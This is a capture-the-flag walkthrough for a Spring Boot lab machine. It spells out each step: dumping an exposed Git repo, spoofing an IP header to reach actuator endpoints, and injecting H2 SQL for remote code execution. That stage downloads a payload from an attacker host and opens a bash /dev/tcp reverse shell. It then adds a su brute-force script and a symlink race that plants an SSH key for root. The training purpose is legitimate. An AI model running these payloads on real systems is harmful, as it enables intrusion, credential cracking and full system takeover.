# [Spring](https://tryhackme.com/room/spring)

## Can you hack your way in to a Hello World application?

# Spring

## John created a simple Hello World Web Application, he is still learning. See if you can find a way to hack him.

### What's the flag in foothold.txt?

1. Start with an nmap scan to identify open ports and services on the target machine.

```bash
nmap <TARGET_IP>
```

[SCREEN01]

2. Use gobuster to enumerate directories and discover hidden paths. This scan will reveal a `/sources/new/.git/` directory.

```bash
gobuster dir -u https://<TARGET_IP>:443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

3. Use [GitTools](https://github.com/internetwache/GitTools) to dump the exposed Git repository.

```bash
./GitTools/Dumper/gitdumper.sh https://<TARGET_IP>/sources/new/.git/ git
```

4. Navigate to the dumped repository and examine the Git commit history to understand the development timeline and identify potentially interesting commits.

```bash
git log
```

The author is `johnsmith@spring.thm`

[SCREEN02]

5. Reset to a commit that appears to contain useful configuration.

```bash
git reset --hard 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
```

6. In `src/main/java/com/onrushin/spring/Application.java` we find the security configuration. This reveals that the `/actuator` endpoints are protected by IP address filtering, only allowing access from the `172.16.0.0/24` subnet.

```java
    @Configuration
    @EnableWebSecurity
    static class SecurityConfig extends WebSecurityConfigurerAdapter {

        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")
                    .and().csrf().disable();
        }

    }
```

7. In `src/main/resources/application.properties` we find a custom header `server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04`. This header is used by Tomcat's RemoteIpValve to determine the client's real IP address, which can be spoofed to bypass the IP-based access control.

8. Test access to the actuator endpoint by spoofing our IP address using the custom header. By setting this header to an IP in the allowed range, we can bypass the IP restriction.

```bash
curl -k -v https://<TARGET_IP>/actuator -H 'x-9ad42dea0356cb04: 172.16.0.0'
```

9. Create a reverse shell script that will connect back to your machine when executed. This will be uploaded to the target and executed via the Spring Boot Actuator exploit.

```bash
echo "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" > revshell.sh
```

10. Start a simple HTTP server to host the reverse shell script so the target can download it.

```bash
python3 -m http.server 80
```

11. Exploit the Spring Boot Actuator `/env` endpoint combined with H2 database to achieve Remote Code Execution. This uses the `spring.datasource.hikari.connection-test-query` property to inject SQL that creates a function and executes system commands. The first payload downloads our reverse shell script to `/tmp/`.

```bash
curl -k -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.0' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://<ATTACKER_IP>/revshell.sh -O /tmp/revshell.sh\');\"}' "https://<TARGET_IP>/actuator/env"
```

12. Restart the Spring Boot application to apply the malicious configuration changes. This triggers the connection test query, which executes our injected SQL and downloads the reverse shell script.

```bash
curl -k -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.0' "https://<TARGET_IP>/actuator/restart"
```

[SCREEN03]

13. Set up a netcat listener to catch the incoming reverse shell connection.

```bash
nc -lvnp 4444
```

14. Send another malicious payload to execute the downloaded reverse shell script. This time we're calling `bash /tmp/revshell.sh` to establish the reverse connection.

```bash
curl -k -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'bash /tmp/revshell.sh\');\"}' "https://<TARGET_IP>/actuator/env"
```

15. Restart the application again to trigger the reverse shell execution.

```bash
curl -k -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.0' "https://<TARGET_IP>/actuator/restart"
```

16. Once the reverse shell connects, read the first flag. You should now have a shell as the user running the Spring Boot application.

```bash
cat /opt/foothold.txt
```

[SCREEN04]

---

### What's the flag in user.txt?

1. Back in the Git repository, examine `src/main/resources/application.properties`. We find two passwords: `DummyKeystorePassword123` and `PrettyS3cureSpringPassword123`. The commit message says `changed security password to my usual format`, which suggests the user `johnsmith` follows a pattern for passwords. Create a wordlist of capitalized words from rockyou.txt to test variations of this password pattern.

```bash
cat /usr/share/wordlists/rockyou.txt | grep -E ^[A-Z][a-z]+$ > capitalized_words.txt
```

2. Create a brute force script to test password variations. The pattern appears to be `PrettyS3cure<Word>Password123.` where `<Word>` is a capitalized word. This script will test each word from the wordlist.

```bash
#!/bin/bash

set -m
export TOP_PID=$$
trap "trap - SIGTERM && kill -- -$$" INT SIGINT SIGTERM EXIT

# https://github.com/fearside/ProgressBar/blob/master/progressbar.sh
function progressbar {
        let _progress=(${1}*100/${2}*100)/100
        let _done=(${_progress}*4)/10
        let _left=40-$_done

        _done=$(printf "%${_done}s")
        _left=$(printf "%${_left}s")

        printf "\rCracking : [${_done// /#}${_left// /-}] ${_progress}%%"
}

function brute() {
        keyword=$1
        password="PrettyS3cure${keyword}Password123."
        output=$( ( sleep 0.2s && echo $password ) | script -qc 'su johnsmith -c "id"' /dev/null)
        if [[ $output != *"Authentication failure"* ]]; then
                printf "\rCreds Found! johnsmith:$password\n$output\nbye..."
                kill -9 -$(ps -o pgid= $TOP_PID  | grep -o '[0-9]*')
        fi
}

wordlist=$1

count=$(wc -l $wordlist| grep -o '[0-9]*')
current=1

while IFS= read -r line
do
        brute $line &
        progressbar ${current} ${count}
        current=$(( current + 1 ))
done < $wordlist

wait
```

Save this as `su_brute_force.sh`.

3. Transfer both the script and wordlist to the target machine using wget.

```bash
cd /tmp
wget <ATTACKER_IP>/su_brute_force.sh
wget <ATTACKER_IP>/capitalized_words.txt
```

4. Run the brute force script. This will test each word in the pattern until it finds the correct password for the `johnsmith` user.

```bash
time bash su_brute_force.sh capitalized_words.txt
```

[SCREEN05]

5. Upgrade to a proper TTY shell and switch to the johnsmith user with the discovered credentials.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su johnsmith
# PrettyS3cure*******Password123.
```

6. Read the user flag from johnsmith's home directory.

```bash
cat /home/johnsmith/user.txt
```

[SCREEN06]

---

### What's the flag in root.txt?

1. Enumerate the system for privilege escalation vectors. Check the systemd service configuration for the Spring Boot application, as it was mentioned to be running as a service.

```bash
cat /etc/systemd/system/spring.service
```

The service configuration reveals:

```
[Unit]
Description=Spring Boot Application
After=syslog.target
StartLimitIntervalSec=0

[Service]
User=root
Restart=always
RestartSec=1
ExecStart=/root/start_tomcat.sh

[Install]
WantedBy=multi-user.target
```

The key finding here is that the Spring Boot application runs as **root** and has automatic restart enabled (`Restart=always` with `RestartSec=1`).

2. Check the current status of the spring service to confirm it's running.

```bash
systemctl status spring
```

[SCREEN07]

3. The privilege escalation vector exploits a race condition in the logging mechanism. When the Spring Boot application starts, it creates log files in a directory where johnsmith has write access (`/home/johnsmith/tomcatlogs`). By creating symbolic links with timestamps matching future log filenames and then causing the application to restart, we can write SSH public keys to root's authorized_keys file.

Create the exploitation script:

```bash
#!/bin/bash

[ -f ./key ] && true || ssh-keygen -b 2048 -t ed25519 -f ./key -q -N ""
pubkey=$(cat ./key.pub)

curl -k -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.0'

d=$(date '+%s')

for i in {1..30}
do
 let time=$(( d + i ))
 ln -s /root/.ssh/authorized_keys "$time.log"
done

sleep 30s

curl -k --data-urlencode "name=$pubkey" https://localhost/
sleep 5s

ssh -o "StrictHostKeyChecking=no" -i ./key root@localhost
```

Save this as `get_root.sh`.

4. Transfer the script to the target, execute it from the tomcatlogs directory where johnsmith has write permissions, and obtain root access. Once you have root, read the final flag.

```bash
cd /home/johnsmith/tomcatlogs
wget <ATTACKER_ID>/get_root.sh
bash get_root.sh
cat root.txt
```
